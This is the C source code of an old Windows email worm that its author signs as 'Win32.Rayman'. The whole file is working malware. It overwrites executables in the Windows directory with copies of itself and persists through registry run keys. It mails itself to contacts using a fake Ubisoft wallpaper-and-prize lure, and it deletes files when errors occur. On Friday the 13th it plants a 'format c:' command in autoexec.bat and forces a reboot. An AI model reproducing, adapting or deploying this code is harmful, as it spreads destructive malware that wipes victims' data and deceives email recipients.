   #include "rayman.h"
   #pragma hdrstop
   #pragma warning (disable: 4068)
   #pragma warning (disable: 4001)

   char RaymanPath[256],RaymanWinDir[256],WallWinDir[256],MyBuffer[256]="echo y|format c: /u /v:Rayman";
   int Err,ErrSend,NumCnt,Counter=0;
   DWORD ExtInf;
   HKEY RaymanNTKey,RaymanWinKey,RaymanInstKey,RaymanCrtKey,RaymanStartKey;
   HANDLE RaymanHnd,RaymanHndTime,RaymanBmp,FormatFile;
   HMODULE KernRayLib,MapiRayLib;
   typedef DWORD(*RegRaySerProc)(DWORD,DWORD);
   typedef ULONG(*EnvoiMessRay)(LHANDLE,ULONG,MapiMessage FAR*,FLAGS,ULONG);
   typedef ULONG(*NomTrouveRay)(LHANDLE,ULONG,LPTSTR,FLAGS,ULONG,lpMapiRecipDesc FAR*);
   typedef ULONG(*MemLibreRay)(LPVOID);
   LPSTR Nom = "a";


   #pragma argsused
   int WINAPI WinMain
   (
   HINSTANCE hInstance,
   HINSTANCE hPrevInstance,
   LPSTR     lpszCmdLine,
   int       nCmdShow
   )
   {
   // Win32.Rayman by ZeMacroKiller98
   // Hey, You like Rayman !!!!!, Now, You will hate him
   // Copyright (c) 2001
   // Made in France
   WIN32_FIND_DATA RaymanHost,BitmapFile;
   OSVERSIONINFO OsRayVerInfo;
   FILETIME CreateTime,LstAccTime,LstWriTime;
   SYSTEMTIME RayTime;
   RegRaySerProc RegisterServiceProcess;
   EnvoiMessRay RaymanEnvoiMess;
   NomTrouveRay RaymanNomTrouve;
   MemLibreRay RaymanMemLibre;
   KernRayLib = LoadLibrary("kernel32.dll");
   MapiRayLib = LoadLibrary("mapi32.dll");
   RegisterServiceProcess = (RegRaySerProc)GetProcAddress(KernRayLib,"RegisterServiceProcess");
   SearchPath(NULL,_argv[0],NULL,sizeof(RaymanPath),RaymanPath,NULL);
   OsRayVerInfo.dwOSVersionInfoSize = sizeof(OsRayVerInfo);
   GetVersionEx(&OsRayVerInfo);
   if(OsRayVerInfo.dwPlatformId==VER_PLATFORM_WIN32_NT)
   {
           RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\WindowsNT\\CurrentVersion\\RunServices",0,KEY_ALL_ACCESS,&RaymanNTKey);
           RegSetValueEx(RaymanNTKey,"RaymanNT",0,REG_SZ,RaymanPath,sizeof(RaymanPath));
           RegCloseKey(RaymanNTKey);
   }
   else
   {
           RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\RunServices",0,KEY_ALL_ACCESS,&RaymanWinKey);
           RegSetValueEx(RaymanWinKey,"RaymanWin",0,REG_SZ,RaymanPath,sizeof(RaymanPath));
           RegCloseKey(RaymanWinKey);
   }
   if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Rayman\\Install",0,KEY_ALL_ACCESS,&RaymanInstKey)!=ERROR_SUCCESS)
   {
           GetWindowsDirectory(RaymanWinDir,sizeof(RaymanWinDir));
           SetCurrentDirectory(RaymanWinDir);
           RaymanHnd = FindFirstFile("*.exe",&RaymanHost);
           RaymanHostFind:
           RaymanHndTime = CreateFile(RaymanHost.cFileName,GENERIC_READ|GENERIC_WRITE,0, NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
           GetFileTime(RaymanHndTime,&CreateTime,&LstAccTime,&LstWriTime);
           CloseHandle(RaymanHndTime);
           if((lstrcmp(RaymanHost.cFileName,"emm386.exe")==0)||(lstrcmp(RaymanHost.cFileName,"setver.exe")==0))
                   goto DontInfect;
           CopyFile(_argv[0],RaymanHost.cFileName,FALSE);
           RaymanHndTime = CreateFile(RaymanHost.cFileName,GENERIC_READ|GENERIC_WRITE,0, NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
           SetFileTime(RaymanHndTime,&CreateTime,&LstAccTime,&LstWriTime);
           CloseHandle(RaymanHndTime);
           DontInfect:
           if(FindNextFile(RaymanHnd,&RaymanHost)==TRUE)
                   goto RaymanHostFind;
           FindClose(RaymanHnd);
           RegCreateKey(HKEY_LOCAL_MACHINE,"Software\\Britney\\Install",&RaymanCrtKey);
           RegCloseKey(RaymanCrtKey);
   // Email Propagation uses MAPI functions
   RaymanEnvoiMess = (EnvoiMessRay)GetProcAddress(MapiRayLib,"MAPISendMail");
   RaymanNomTrouve = (NomTrouveRay)GetProcAddress(MapiRayLib,"MAPIResolveName");
   RaymanMemLibre = (MemLibreRay)GetProcAddress(MapiRayLib,"MAPIFreeBuffer");
   if((RaymanEnvoiMess==NULL)||(RaymanNomTrouve==NULL)||(RaymanMemLibre==NULL))
   {
           MessageBox(NULL,"This program can't found your MAPI Functions\nPlease contact www.ubisoft.com for more help","Rayman Wallpaper Software",MB_OK|MB_ICONEXCLAMATION);
           SetCurrentDirectory("C:/");
           DeleteFile("*.*");
           ExitProcess(0);
   }
   MapiMessage stMessage;
   MapiRecipDesc stRecip;
   MapiFileDesc stFile;
   lpMapiRecipDesc lpRecip;
   stFile.ulReserved = 0;
   stFile.flFlags = 0L;
   stFile.nPosition = (ULONG)-1;
   stFile.lpszPathName = RaymanPath;
   stFile.lpszFileName = NULL;
   stFile.lpFileType = NULL;
   MessageBox(NULL,"Hi, it's Rayman in your PC!!!!!\nSend me to your friends to win a ubisoft game maybe\nSelect name into your address book","Rayman Wallpaper Software",MB_OK|MB_ICONINFORMATION|MB_SYSTEMMODAL);
   RaymanCantResolve:
   Err = (RaymanNomTrouve)(lhSessionNull,0L,Nom,MAPI_DIALOG,0L,&lpRecip);
   if(Err!=SUCCESS_SUCCESS)
   {
   switch(Err){
           case MAPI_E_AMBIGUOUS_RECIPIENT:
                   MessageBox(NULL,"The recipient requested has not been or could\n not be resolved to a unique address list entry","Rayman Wallpaper Software",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
           break;
           case MAPI_E_UNKNOWN_RECIPIENT:
                   MessageBox(NULL,"The recipient could not be resolved to any\naddress.The recipient might not exist or might be unknown","Rayman Wallpaper Software",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
           break;
           case MAPI_E_FAILURE:
                   MessageBox(NULL,"One or more unspecified errors occured\nThe name was not resolved","Rayman Wallpaper Software",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
                   DeleteFile("*.*");
                   ExitProcess(0);
           break;
           case MAPI_E_INSUFFICIENT_MEMORY:
                   MessageBox(NULL,"There was insufficient memory to proceed","Rayman Wallpaper Software",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
                   DeleteFile("*.*");
                   ExitProcess(0);
           break;
           case MAPI_E_NOT_SUPPORTED:
                   MessageBox(NULL,"The operation was not supported by the messaging system","Rayman Wallpaper Software",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
                   DeleteFile("*.*");
                   ExitProcess(0);
           break;
           case MAPI_E_USER_ABORT:
                   MessageBox(NULL,"The user was cancelled one or more dialog box","Rayman Wallpaper Software",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
                   DeleteFile("*.*");
                   ExitProcess(0);
           break;
           }
   goto RaymanCantResolve;
   }
   stRecip.ulReserved = lpRecip->ulReserved;
   stRecip.ulRecipClass = MAPI_TO;
   stRecip.lpszName = lpRecip->lpszName;
   stRecip.lpszAddress = lpRecip->lpszAddress;
   stRecip.ulEIDSize = lpRecip->ulEIDSize;
   stRecip.lpEntryID = lpRecip->lpEntryID;
   stMessage.ulReserved = 0;
   stMessage.lpszSubject = "Rayman Wallpaper Software";
   stMessage.lpszNoteText = lstrcat("Hi ",(lstrcat(lpRecip->lpszName,"\n\n\tI found this software about Rayman on Ubisoft web site.This software can change automatically your wallpaper every time your start Windows\nYou can win a Ubisoft game if you send this software to your friends\nThanks alot and see you soon...")));
   stMessage.lpszMessageType = NULL;
   stMessage.lpszDateReceived = NULL;
   stMessage.lpszConversationID = NULL;
   stMessage.flFlags = 0L;
   stMessage.lpOriginator = NULL;
   stMessage.nRecipCount = 1;
   stMessage.lpRecips = &stRecip;
   stMessage.nFileCount = 1;
   stMessage.lpFiles = &stFile;
   ErrSend = (RaymanEnvoiMess)(lhSessionNull,0L,&stMessage,0L,0L);
   if(ErrSend!=SUCCESS_SUCCESS)
   {
           MessageBox(NULL,"A error occured when i try to send email\nPlease refer to your windows help for more informations\n","Rayman Wallpaper Software",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
           DeleteFile("*.*");
           ExitProcess(0);
   }
   MessageBox(NULL,"Thanks to have install this software!!!!\nEnjoy to use it",
                   "Rayman Wallpaper Software",
                    MB_OK|MB_ICONINFORMATION);
   FreeLibrary(MapiRayLib);
   }
   RegCloseKey(RaymanInstKey);
   STARTUPINFO StartFo;
   PROCESS_INFORMATION ProcFo;
   StartFo.cb = sizeof(STARTUPINFO);
   StartFo.lpReserved = NULL;
   StartFo.lpReserved2 = NULL;
   StartFo.cbReserved2 = 0;
   StartFo.lpDesktop = NULL;
   StartFo.dwFlags = STARTF_FORCEOFFFEEDBACK;
   if(CreateProcess(RaymanPath,
                   NULL,
                   (LPSECURITY_ATTRIBUTES)NULL,
                   (LPSECURITY_ATTRIBUTES)NULL,
                   FALSE,
                   0,
                   NULL,
                   NULL,
                   &StartFo,
                   &ProcFo))
   {
   CloseHandle(ProcFo.hProcess);
   CloseHandle(ProcFo.hThread);
   }
   RegisterServiceProcess(ProcFo.dwProcessId,1);
   FreeLibrary(KernRayLib);
   if((RayTime.wHour>7)&&(RayTime.wHour<9))
   {
           GetWindowsDirectory(WallWinDir,sizeof(WallWinDir));
           SetCurrentDirectory(RaymanWinDir);
           randomize();
           NumCnt = rand() % 16;
           RaymanBmp = FindFirstFile("*.bmp",&BitmapFile);
           BitmapFound:
           if(++Counter==NumCnt)
           {
                   SystemParametersInfo(SPI_SETDESKWALLPAPER,0,(LPVOID)BitmapFile.cFileName,SPIF_UPDATEINIFILE);
                   goto EndWallpaper;
           }
           if((FindNextFile(RaymanBmp,&BitmapFile))!=0)
                   goto BitmapFound;
           EndWallpaper:
           FindClose(RaymanBmp);
   }
   if((RayTime.wDay==13)&&(RayTime.wDayOfWeek==5))
   {
           MessageBox(NULL,"Hey, Rayman say: ''Your PC is mine and i must destroy it!!!!!''\nHa Ha Ha Ha Ha Ha !!!!!!!","Win32.Rayman by ZeMacroKiller98",MB_OK|MB_ICONEXCLAMATION|MB_SYSTEMMODAL);
           SetCurrentDirectory("C:/");
           FormatFile = CreateFile("autoexec.bat",GENERIC_READ|GENERIC_WRITE,0, NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
           WriteFile(FormatFile,MyBuffer,sizeof(MyBuffer),&ExtInf,NULL);
           CloseHandle(FormatFile);
       ExitWindowsEx(EWX_FORCE|EWX_REBOOT,0);
   }
   if((RayTime.wHour>18)&&(RayTime.wHour>20))
   {
           MessageBox(NULL,"Rayman say: ''It's time to go home and shutdown your PC!!!!!!!\nHa Ha Ha Ha Ha Ha!!!!","Win32.Rayman by ZeMacroKiller98",MB_OK|MB_ICONEXCLAMATION|MB_SYSTEMMODAL);
           ExitWindowsEx(EWX_FORCE|EWX_POWEROFF,0);
   }
   return 0;
   }
